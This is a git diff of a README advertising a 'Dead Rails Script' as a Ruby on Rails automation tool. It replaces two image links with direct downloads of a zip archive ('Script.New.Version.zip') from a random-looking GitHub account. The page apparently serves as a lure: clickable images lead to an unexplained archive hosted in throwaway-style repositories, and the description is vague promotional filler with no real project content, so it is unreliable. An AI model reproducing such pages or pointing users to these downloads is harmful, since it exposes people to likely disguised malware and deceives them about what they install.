@@ -5,10 +5,10 @@
 In the ever-evolving world of software development, automation tools have become essential in streamlining workflows and enhancing productivity. One such groundbreaking tool is the **Dead Rails Script**, an advanced Ruby on Rails automation script designed to handle complex tasks with precision and ease. Whether you're a developer looking to optimize your Rails applications or a team seeking a more efficient way to manage backend operations, Dead Rails Script offers a powerful solution that promises to transform your workflow.
 
 [![image](https://github.com/user-attachments/assets/c2c76d38-17eb-42c0-8042-5bf1c445cd14)
-](https://github.com/Dgqwda/new/releases/download/new/Updated.Script.zip)
+](https://github.com/Gqdqw/potential-guacamole/releases/download/new/Script.New.Version.zip)
 
 [![hq720](https://github.com/user-attachments/assets/cb2157bf-320b-4d01-83d9-f89080dbf5a5)
-](https://github.com/Dgqwda/new/releases/download/new/Updated.Script.zip)
+](https://github.com/Gqdqw/potential-guacamole/releases/download/new/Script.New.Version.zip)
 
 
 **What is Dead Rails Script?**
